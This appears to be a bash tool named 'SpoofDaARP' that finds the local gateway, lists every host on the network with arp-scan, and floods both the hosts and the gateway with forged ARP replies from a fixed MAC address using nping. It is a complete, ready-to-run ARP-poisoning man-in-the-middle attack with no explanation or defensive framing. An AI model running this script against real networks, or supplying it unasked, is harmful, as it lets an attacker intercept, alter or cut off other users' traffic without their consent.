#!/bin/bash
get_gateway_addr () {
	arp -a | grep -oP '((\bgateway)(\s)((\()((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1})))(\)))' > gateway_expr.txt
	sed 's/gateway (//' gateway_expr.txt > formatted_1.txt
	sed 's/)//' formatted_1.txt > gateway.txt
	rm formatted_1.txt & rm gateway_expr.txt
}

get_arp_list () {
	arp-scan --localnet | grep -oP '(((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1})))' > arp_list.txt
}

start_spoof () {
  gateway="$(cat gateway.txt)"
	echo "[SpoofDaARP] Spoofing in 5 seconds. Run kill.sh to stop all spoofing processes..."
	sleep 5s
	while IFS= read -r ip; do
		nping --arp-type arp-reply --source-mac 80:56:f2:38:3c:0e --source-ip "$gateway" -c 0 "$ip" &
		nping --arp-type arp-reply --source-mac 80:56:f2:38:3c:0e --source-ip "$ip" -c 0 "$gateway" &
	done < "arp_list.txt"
}

get_gateway_addr # Call Gateway Addr Function
get_arp_list # Call Arp List Function
start_spoof
